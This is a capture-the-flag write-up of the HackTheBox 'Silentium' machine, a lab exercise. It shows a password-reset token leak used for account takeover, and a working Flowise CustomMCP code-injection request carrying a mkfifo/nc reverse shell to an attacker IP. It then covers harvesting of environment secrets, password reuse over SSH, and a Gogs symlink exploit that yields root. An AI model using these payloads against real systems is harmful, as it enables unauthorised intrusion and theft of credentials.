# Silentium — HackTheBox

https://app.hackthebox.com/machines/Silentium?sort_by=created_at&sort_type=desc
**Difficulty :** Easy
**OS :** Linux
**Date :** 16 April 2026

---

## 1. Recon

```bash
> nmap 10.129.30.9
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-16 12:38 -03
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 22.00% done; ETC: 12:38 (0:00:07 remaining)
Stats: 0:01:01 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 65.28% done; ETC: 12:39 (0:00:33 remaining)
Stats: 0:01:45 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 92.20% done; ETC: 12:40 (0:00:09 remaining)
Nmap scan report for 10.129.30.9
Host is up (0.17s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
1060/tcp filtered polestar
4998/tcp filtered maybe-veritas
8701/tcp filtered unknown

```

After running an nmap of the machine we can see some open ports. 
The only new thing from the starting point machines is the "polestar" and "maybe-veritas" services. I do not know what do they mean but it could be an opening gate.


```bash
> ffuf -u  http://silentium.htb/FUZZ -w Documents/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host:FUZZ.silentium.htb" -fs 178 -mc all

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://silentium.htb/FUZZ
 :: Wordlist         : FUZZ: /home/guillaume/Documents/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.silentium.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 178
________________________________________________

:: Progress: [1/5000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:: 
Progress: [40/5000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Error:: Progress: [40/5000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Error:: Progress: [80/5000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Error:: Progress: [80/5000] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Error
staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 171ms]
```

after ffuf-ing the host for subdomains, I encountered the staging.silentium.htb
After adding this new subdomain to my /etc/hosts file, I reach the address in my  browser.

I am being redirected to http://staging.silentium.htb/signin

![login](images/login.png)

A classic login page.

there is an option to retrieve a forgotten password by entering an email. I try first with classic emails such as admin@silentium.htb but none of them worked.


![ben](images/forgot-password.png)

I then remember that on the normal silentium.htb website there are a list of the company founders and users.
A lot of companies use [name@company.com] for their emails. but this rule changes between companies, you don't know in advance if it's [name@...] or [firstname.lastname@...], or [first_letter_of_first_name.fullname@...]
So, something interesting here is that name "ben". just Ben. So I tried it as an email.
ben@silentium.htb

![ben](images/silentium-ben.png)

And it worked.

![forgot-password](images/forgot-password.png)

Got sent a JSON response for the user ben, we can see that the system recognizes it as admin so this is a pretty good sign. We also have a tempToken, normally this is what we use in the email we are being sent when we want to change password. Obviously I do not have access to Ben's email.

```json
{
	"user": {
		"id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
		"name": "admin",
		"email": "ben@silentium.htb",
		"credential": "$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG",
		"tempToken": "zjExNFqnzg6jxv7dh0BFe2uqUYx5aGx2WkBHe0AHTfUJIInpJChnhbmBWp5mgTq0",
		"tokenExpiry": "2026-04-16T16:32:10.248Z",
		"status": "active",
		"createdDate": "2026-01-29T20:14:57.000Z",
		"updatedDate": "2026-04-16T16:17:10.000Z",
		"createdBy": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
		"updatedBy": "e26c9d6c-678c-4c10-9e36-01813e8fea73"
	},
	"organization": {},
	"organizationUser": {},
	"workspace": {},
	"workspaceUser": {},
	"role": {}
}
```

Then, with all those information I accessed the page to reset Ben's password. I used the tempToken from the json response (it's different from the JSON above because I clicked the 'reset' password button twice accidentally, sending another request and so another token).
I changed Ben's password to 'Admin123!' to comply with the company's password rules.

![ben](images/reset-password.png)

After updating the password and logging in as ben, I am now logged in into the Flowise app of the company

![ben](images/logged-in.png)

## 2. Enumeration

In the admin panel settings in the up right corner, there is the possibility of importing a file. Let's see if this can be used as an exploit. 

The flowise version is  3.0.5
![ben](images/version.png)

https://www.sonicwall.com/blog/flowiseai-custom-mcp-node-remote-code-execution-

**Vulnerable Flowise Version**: The target must be running FlowiseAI Flowise version >= 2.2.7-patch.1 and < 3.0.6.

The vulnerability allows unauthenticated attackers to execute arbitrary JavaScript code on the server by injecting malicious payloads through the mcpServerConfig parameter of the CustomMCP node's API endpoint.

The root cause of CVE-2025-59528 lies in the convertToValidJSONString function within CustomMCP.ts (Lines 262-270). This function is responsible for converting user-provided MCP server configuration strings into valid JSON. However, instead of using a safe JSON parser, it passes the user input directly to JavaScript's Function() constructor — which is functionally identical to eval(). The expression Function('return ' + inputString)() compiles and executes the user-supplied string as arbitrary JavaScript code with full Node.js runtime privileges.

## 3. Exploitation

Now that I found the vulnerability, I have to actually make the exploit. 
Either I find a premade file or I have to find a way to contact the API with a malicious payload request.

https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p
```bash
> curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"nc -zv 10.10.14.159 443\");return 1;})()})"
    }
  }'
[{"label":"No Available Actions","name":"error","description":"No available actions, please check your API key and refresh"}]%                                  
```

```bash
> sudo nc -lvnp 443
[sudo] password for guillaume: 
Listening on 0.0.0.0 443
Connection received on 10.129.31.40 33725           
```

RCE worked, now let's put a reverse shell into the payload.

```bash
> sudo nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.129.31.40 43829
/bin/sh: can't access tty; job control turned off
```


```bash
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.159 443 >/tmp/f\");return 1;})()})"
    }
  }'
```

```bash
/ # whoami
root
/ # ls
bin
dev
etc
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
/ # 

```

The initial access gave me a root shell on a system that seemed isolated.
This machine is a closed Docker env hosting the Flowise, not a complete linux machine.
```bash
/var/opt # ps aux      
PID   USER     TIME  COMMAND
    1 root      0:33 node /usr/local/bin/flowise start

```

Knowing that, I proceeded to look at the Docker environment variables. It's common practice but risky one to store secrets such as configs or password in there.

```bash
/ # env
FLOWISE_PASSWORD=F1l3_d0ck3r
ALLOW_UNAUTHORIZED_CERTS=true
NODE_VERSION=20.19.4
HOSTNAME=c78c3cceb7ba
YARN_VERSION=1.22.22
SMTP_PORT=1025
SHLVL=3
PORT=3000
HOME=/root
SENDER_EMAIL=ben@silentium.htb
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
JWT_ISSUER=ISSUER
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
SMTP_USERNAME=test
SMTP_SECURE=false
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
FLOWISE_USERNAME=ben
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DATABASE_PATH=/root/.flowise
JWT_TOKEN_EXPIRY_IN_MINUTES=360
JWT_AUDIENCE=AUDIENCE
SECRETKEY_PATH=/root/.flowise
PWD=/
SMTP_PASSWORD=r04D!!_R4ge
NVIDIA_NIM_LLM_MODE=managed
SMTP_HOST=mailhog
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SMTP_USER=test
```

Within these variables I found an Interesting password in env SMTP_PASSWORD=`r04D!!_R4ge`
Considering that admins often reuse passwords, I tried an ssh connection on the host machine as user 'ben'.

```bash
> ssh ben@10.129.31.63
ben@10.129.31.63's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)


ben@silentium:~$ ls
user.txt
ben@silentium:~$ cat user.txt
5f9827ac6b2d0f98f5a653507ae00ef1
```


## 4. Privilege Escalation

Using the ss -ltpn to see everything that listens on the machine.
Interesting ports running as localhost (hidden from the outside)
```bash
ben@silentium:~$ ss -ltpn
State   Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process  
LISTEN  0        4096           127.0.0.1:1025           0.0.0.0:*              
LISTEN  0        4096           127.0.0.1:8025           0.0.0.0:*              
LISTEN  0        4096             0.0.0.0:22             0.0.0.0:*              
LISTEN  0        511              0.0.0.0:80             0.0.0.0:*              
LISTEN  0        4096          127.0.0.54:53             0.0.0.0:*              
LISTEN  0        4096           127.0.0.1:43313          0.0.0.0:*              
LISTEN  0        4096       127.0.0.53%lo:53             0.0.0.0:*              
LISTEN  0        4096           127.0.0.1:3000           0.0.0.0:*              
LISTEN  0        4096           127.0.0.1:3001           0.0.0.0:*              
LISTEN  0        4096                [::]:22                [::]:*              
LISTEN  0        511                 [::]:80                [::]:*   
```


Gogs on port 3001 running as root

```bash
ben@silentium:~$ find / -name "app.ini" 2>/dev/null

/opt/gogs/gogs/custom/conf/app.ini
ben@silentium:~$ 
ben@silentium:~$ cat /opt/gogs/gogs/custom/conf/app.ini 
BRAND_NAME = Gogs
RUN_USER   = root
RUN_MODE   = prod

[server]
HTTP_ADDR        = 127.0.0.1
HTTP_PORT        = 3001
DOMAIN           = staging-v2-code.dev.silentium.htb
ROOT_URL         = http://staging-v2-code.dev.silentium.htb/
OFFLINE_MODE     = false
EXTERNAL_URL     = http://staging-v2-code.dev.silentium.htb:3001/
DISABLE_SSH      = false
SSH_PORT         = 22
START_SSH_SERVER = false

[database]
TYPE     = sqlite3
PATH     = /opt/gogs/data/gogs.db
HOST     = 127.0.0.1:5432
NAME     = gogs
SCHEMA   = public
USER     = gogs
PASSWORD = 
SSL_MODE = disable

[repository]
ROOT_PATH      = /root/gogs-repositories
DEFAULT_BRANCH = master
ROOT           = /root/gogs-repositories

[session]
PROVIDER = file

[log]
MODE      = file
LEVEL     = Info
ROOT_PATH = /opt/gogs/log

[security]
INSTALL_LOCK = true
SECRET_KEY   = sdsrcxSm0iC7wDO

[email]
ENABLED = false

[auth]
REQUIRE_EMAIL_CONFIRMATION  = false
DISABLE_REGISTRATION        = false
ENABLE_REGISTRATION_CAPTCHA = true
REQUIRE_SIGNIN_VIEW         = false

[user]
ENABLE_EMAIL_NOTIFICATION = false

[picture]
DISABLE_GRAVATAR        = false
ENABLE_FEDERATED_AVATAR = false
```


port forwarding Gogs service : 
Create a port 3001 on my machine, then when we open 127.0.0.1:3000 on our machine, the packets enters in the ssh tunnel and is being forwarded on the HTB machine. Gogs and other services detects it as coming from the machine and so accepts the packet.

```bash
ssh -L 3001:127.0.0.1:3001 ben@10.129.31.63
```

Into the config file, email confirmation is disabled so I just registered a new account.

![gogs](images/gogs.png)

After some research I found this CVE using a RCE via a symlink.

```bash
> python3 CVE-2025-8110-RCE.py -u http://127.0.0.1:3001 -lh 10.10.14.159 -lp 6666 -p 'admin'


   _____ _____   _____ 
  / ____|  __ \ / ____|
 | |  __| |__) | |  __ 
 | | |_ |  _  /| | |_ |
 | |__| | | \ \| |__| |
  \_____|_|  \_\\_____|
                       
CVE-2025-8110 - Gogs Remote Code Execution
Authenticated RCE via Symlink + sshCommand Injection


Author : ghxtsec
Based on: zAbuQasem original PoC
------------------------------------------------

[+] Login exitoso
Repo creation status: 201
[+] Repo creado: 06cd6b1c8e2c
Clonando con URL: http://gui:admin@127.0.0.1:3001/gui/06cd6b1c8e2c.git
[master c99e226] Add malicious symlink
 1 file changed, 1 insertion(+)
 create mode 120000 malicious_link
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 16 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 309 bytes | 309.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
To http://127.0.0.1:3001/gui/06cd6b1c8e2c.git
   b16aaad..c99e226  master -> master
[+] Symlink subido y pusheado correctamente
[-] Error: HTTPConnectionPool(host='127.0.0.1', port=3001): Read timed out. (read timeout=10)

```



```bash
> nc -lvnp  6666
Listening on 0.0.0.0 6666
Connection received on 10.129.31.63 57266
bash: cannot set terminal process group (1488): Inappropriate ioctl for device
bash: no job control in this shell
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/2# ls
ls
malicious_link
README.md
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/2# cd
cd
root@silentium:~# ls
ls
gogs-repositories
root.txt
root@silentium:~# cat root.txt
cat root.txt
88ceb82e9d5a1a538d87c50a37316da9
root@silentium:~# 

```


CVE-2025-8110 (Final Privilege Escalation)


- **The Symlink (Symbolic Link):** The script creates a file that acts as a "shortcut" pointing to the server's internal Git configuration file (`.git/config`).
- **The Bypass:** Normally, Gogs prevents direct editing of this sensitive file. However, by using the API, the script successfully "pushes" this symbolic link to the repository. The exploit is because Gogs lacks verification. Gogs does not verify if the file that is being edited is a symlink to another important file to a dangerous or prohibed file or directory (in this case the .git/ containing the servers config). By letting a user write into this symlink who is now pointing to .git/config, Gogs allows this user to update the settings and rules of the Git server.
- **The Poisoning (Injection):** The script uses this symlink to overwrite the actual Git `config` file. It injects a specific option called `sshCommand`.
- **The Execution:** In Git, the `sshCommand` parameter defines which program to run when performing network operations. The script sets this to your **Reverse Shell** command.
- **The Trigger:** As soon as Gogs performs a Git action (like a push or a commit), it parses its configuration, identifies the malicious `sshCommand`, and executes it.
- **Victory:** Since Gogs is configured to run as **root** (as seen in `app.ini`), the reverse shell it executes grants you an immediate **root shell** on the host machine.

The remediation would be to never make a web service run as root and update Gogs version to one that verifies the destination of symlinks.

## 5. Lessons Learned

practiced tools like ffuf, nmap once again gaining some experience.Used intuition to gain access to Ben's account. Found the Flowise current version and associated vulnerabilty, CVE. used a PoC to gain a reverse shell on the machine, exploring the env variables to get ben's password.

Then, learned how to scan ports on the machine and discovered Gogs ports, used port forwarding to gain access to it. Discovered that Gogs ran as root which is an alarming sign.

Found another vulnerability and CVE associated to Gogs and executed the script to gain once again access to the machine as root.

## 6. Technical Notes